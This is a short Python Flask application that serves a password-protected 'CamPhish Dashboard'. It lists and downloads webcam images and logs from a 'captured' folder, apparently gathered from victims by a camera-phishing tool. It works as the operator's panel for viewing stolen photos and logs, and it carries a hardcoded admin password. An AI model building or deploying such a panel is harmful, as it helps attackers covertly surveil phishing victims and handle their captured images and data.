from flask import Flask, request, Response, send_from_directory, render_template_string
import os
from functools import wraps

CAPTURE_DIR = 'CamPhish/captured'
USERNAME = 'admin'
PASSWORD = 'Benok22!'
app = Flask(__name__)

def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def authenticate():
    return Response(
        'Access denied.\nPlease provide valid credentials.', 401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>CamPhish Dashboard</title>
    <meta http-equiv="refresh" content="30">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; background: #111; color: #eee; margin: 0; padding: 0; }
        h1 { background: #0f0; color: #000; padding: 15px 10px; text-align: center; margin: 0; }
        .container { padding: 20px; }
        .section { margin-bottom: 40px; }
        .section h2 { color: #0af; border-bottom: 1px solid #333; padding-bottom: 5px; }
        .file-link { display: block; color: #0af; text-decoration: none; margin: 5px 0; word-wrap: break-word; }
        .file-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h1>📡 CamPhish Dashboard</h1>
    <div class="container">
        <div class="section">
            <h2>📸 Captured Images</h2>
            {% for file in images %}
                <a class="file-link" href="/file/{{ file }}">{{ file }}</a>
            {% endfor %}
        </div>
        <div class="section">
            <h2>📝 Captured Logs</h2>
            {% for file in logs %}
                <a class="file-link" href="/file/{{ file }}">{{ file }}</a>
            {% endfor %}
        </div>
    </div>
</body>
</html>"""

@app.route('/')
@requires_auth
def dashboard():
    files = sorted(os.listdir(CAPTURE_DIR), reverse=True)
    images = [f for f in files if f.endswith('.jpg')]
    logs = [f for f in files if f.endswith('.txt')]
    return render_template_string(TEMPLATE, images=images, logs=logs)

@app.route('/file/<path:filename>')
@requires_auth
def download_file(filename):
    return send_from_directory(CAPTURE_DIR, filename)

app.run(host='0.0.0.0', port=5000)
